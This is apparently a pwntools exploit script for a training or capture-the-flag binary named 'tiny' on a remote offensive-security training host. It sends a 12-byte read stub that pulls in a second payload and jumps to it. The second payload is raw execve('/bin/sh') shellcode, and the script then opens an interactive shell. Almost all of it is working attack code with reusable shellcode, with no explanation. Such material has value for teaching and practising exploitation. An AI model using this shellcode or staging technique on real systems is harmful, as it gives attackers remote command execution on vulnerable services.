from pwn import *
import time 
context.terminal = ['tmux', 'splitw', '-h']

#r = process("./tiny") 
r = remote("bin.training.offdef.it", 4101)



'''
xor edi, edi
push rdx
push rdx
mov edx, cs
pop rsi
pop rbx
syscall
jmp rbx
'''

shellcode = b"\xEB\x18\x48\xC7\xC0\x3B\x00\x00\x00\x5F\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05\xE8\xE3\xFF\xFF\xFF/bin/sh\x00"
'''
gdb.attach(r, """
	# b *(play +559)
	 b *(play +585)
	 c
	 si
	 ni 
	 si
""")
'''



reading = b"\x31\xFF\x52\x52\x8C\xCA\x5E\x5B\x0F\x05\xFF\xE3"


r.send(reading)
time.sleep(1)

r.send(shellcode)

r.interactive()

input("ls")
